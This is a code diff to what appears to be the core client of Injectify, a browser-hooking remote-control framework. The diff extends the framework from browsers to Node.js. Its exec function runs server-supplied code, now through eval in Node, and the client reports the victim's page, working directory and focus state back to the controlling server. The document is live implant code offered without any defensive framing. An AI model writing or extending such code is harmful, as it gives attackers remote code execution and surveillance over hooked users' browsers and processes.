@@ -1,5 +1,7 @@
 declare var ws: any
 declare var client: any
+declare var process: any
+declare var require: any
 
 /**
  * Injectify core API
@@ -115,21 +117,29 @@ window['injectify'] = class Injectify {
 	 * @param {element} targetParent element to execute the script under, defaults to document.head
 	 */
 	static exec(func, targetParent?: any) {
-		/**
-		 * Default o using document.head as the script container
-		 */
-		if (!targetParent) targetParent = document.head
-		/**
-		 * Turn the function into a self-executing constructor
-		 */
-		if (typeof func === 'function') func = '(' + func.toString() + ')()'
-		/**
-		 * Create, append & remove a script tag
-		 */
-		var script = document.createElement('script')
-		script.innerHTML = func
-		targetParent.appendChild(script)
-		targetParent.removeChild(script)
+		if (this.info.platform === 'browser') {
+			/**
+			 * Default o using document.head as the script container
+			 */
+			if (!targetParent) targetParent = document.head
+			/**
+			 * Turn the function into a self-executing constructor
+			 */
+			if (typeof func === 'function') func = '(' + func.toString() + ')()'
+			/**
+			 * Create, append & remove a script tag
+			 */
+			var script = document.createElement('script')
+			script.innerHTML = func
+			targetParent.appendChild(script)
+			targetParent.removeChild(script)
+		} else {
+			if (typeof func === 'string') {
+				eval('(' + func + ')()')
+			} else {
+				func()
+			}
+		}
 	}
 	/**
 	 * Loads a module from the injectify server
@@ -224,25 +234,35 @@ window['injectify'] = class Injectify {
 	 * Returns information about the current session, browser etc.
 	 */
 	static get sessionInfo() {
-		/**
-		 * Get the correct document.hidden method
-		 */
-		let hidden = 'hidden'
-		if ('mozHidden' in document) {
-			hidden = 'mozHidden'
-		} else if ('webkitHidden' in document) {
-			hidden = 'webkitHidden'
-		} else if ('msHidden' in document) {
-			hidden = 'msHidden'
-		}
-		/**
-		 * Return object
-		 */
-		return {
-			'window': {
-				'url': window.location.href,
-				'title': document.title ? document.title : window.location.host + window.location.pathname,
-				'active': !document[hidden],
+		if (this.info.platform === 'browser') {
+			/**
+			 * Get the correct document.hidden method
+			 */
+			let hidden = 'hidden'
+			if ('mozHidden' in document) {
+				hidden = 'mozHidden'
+			} else if ('webkitHidden' in document) {
+				hidden = 'webkitHidden'
+			} else if ('msHidden' in document) {
+				hidden = 'msHidden'
+			}
+			/**
+			 * Return object
+			 */
+			return {
+				'window': {
+					'url': window.location.href,
+					'title': document.title ? document.title : window.location.host + window.location.pathname,
+					'active': !document[hidden],
+				}
+			}
+		} else {
+			return {
+				'window': {
+					'url': require('file-url')(process.cwd()),
+					'title': process.cwd(),
+					'active': true,
+				}
 			}
 		}
 	}
@@ -364,28 +384,29 @@ injectify.listener((data, topic) => {
  * Page Visibility API
  */
 (() => {
-	let listener
-
-	let focusChange = () => injectify.send('i', injectify.sessionInfo)
-	
-	/**
-	 * Get the correct hidden listener
-	 */
-	if ('hidden' in document) {
-		listener = 'visibilitychange'
-	} else if ('mozHidden' in document) {
-		listener = 'mozvisibilitychange'
-	} else if ('webkitHidden' in document) {
-		listener = 'webkitvisibilitychange'
-	} else if ('msHidden' in document) {
-		listener = 'msvisibilitychange'
-	} else {
-		window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
+	if (injectify.info.platform === 'browser') {
+		let listener
+		let focusChange = () => injectify.send('i', injectify.sessionInfo)
+		
+		/**
+		 * Get the correct hidden listener
+		 */
+		if ('hidden' in document) {
+			listener = 'visibilitychange'
+		} else if ('mozHidden' in document) {
+			listener = 'mozvisibilitychange'
+		} else if ('webkitHidden' in document) {
+			listener = 'webkitvisibilitychange'
+		} else if ('msHidden' in document) {
+			listener = 'msvisibilitychange'
+		} else {
+			window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
+		}
+		/**
+		 * Add listener
+		 */
+		if (listener) document.addEventListener(listener, focusChange)
 	}
-	/**
-	 * Add listener
-	 */
-	if (listener) document.addEventListener(listener, focusChange)
   })()
 
 /**
